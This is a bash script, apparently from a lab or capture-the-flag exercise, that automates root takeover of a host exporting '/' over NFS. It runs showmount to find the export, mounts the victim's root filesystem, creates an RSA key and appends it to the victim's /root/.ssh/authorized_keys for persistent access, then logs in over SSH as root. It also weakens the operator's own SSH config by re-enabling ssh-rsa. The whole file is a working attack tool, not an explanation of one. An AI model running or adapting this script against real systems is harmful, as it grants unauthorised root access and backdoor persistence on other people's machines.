#!/bin/bash
victim_host=$1
error=0

#
echo -e "######################################
#  Exploitables2 nfs root automation #
######################################"
# For newer ssh_keygen version doesnt have id_rsa no more
echo -e "Host * \n
    PubkeyAcceptedKeyTypes=+ssh-rsa \n
    HostKeyAlgorithms=+ssh-rsa" >> ~/.ssh/config
# Must be running as root for this to work
echo [+] Checking root user
if [ "$EUID" -ne 0 ]; then
        echo "[-] You must be root user to use this script"
        exit 1
fi

# Checking for valid string
if [ $# -eq 0 ]; then
        echo "Usage $0 [victim_host] [port]; if no port define default will be 22"
        exit 1;
fi
if [ $2 ]; then
        port="-p $2"
else
        port=""
fi
echo [+] Checking if victim_host have nfs enable
# getting the output
showmount -e $victim_host > output
if [ $? -ne 0 ]; then
        echo [-] Failed to check $victim_host. Exit now
        exit 1
fi 
# check mount option
echo [+] Checking the mount option from $victim_host
if [ $? -ne 0 ]; then
        echo [-] Failed to check $victim_host. Exit now
        exit 1
fi 

# Loop through each line in the output file
while IFS= read -r line; do
    if grep -Fxq "/ *" ./output; then
        error=0  
        break    
    else
        echo "Pattern '$line' not found."
        error=1
    fi
done < output

# After the loop, check if any pattern failed
if [ $error -eq 1 ]; then
    echo "[-] Not exploitable. Exit now"
    exit 1  
fi

echo "[+] Exploitable"
#Creating temp directory
echo [+] Creating /tmp/root directory
mkdir /tmp/r00t
echo [+] Mounting the file system to the newly created directory
mount -t nfs $victim_host:/ /tmp/r00t
if [ $? -ne 0 ]; then
        echo [-] Failed to mount the file system
        exit 1
fi

# creating the key
echo [+] Creating the id_rsa key. Enter a password of your choice or leave blank to automatic enter the host
ssh-keygen -t rsa -m PEM -f ~/.ssh/id_rsa >/dev/null
echo [+] copy our newly created key to $victim_host:/root/root/.ssh/authorized_keys
cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
if [ $? -ne 0 ]; then
        echo [-] Failed to copy the the authorized_key file in  $victim_host:/root/.ssh/authorized_keys. Check the error above!
        exit 1
fi 

echo [+] Everything ready to exploit. Cleaning up!
sudo umount /tmp/r00t
rm output
rm -rf /tmp/r00t
echo [+] You can now use the below command to login victim host anytime
echo [+] sudo ssh -i /root/.ssh/id_rsa $victim_host
ssh root@$victim_host $port
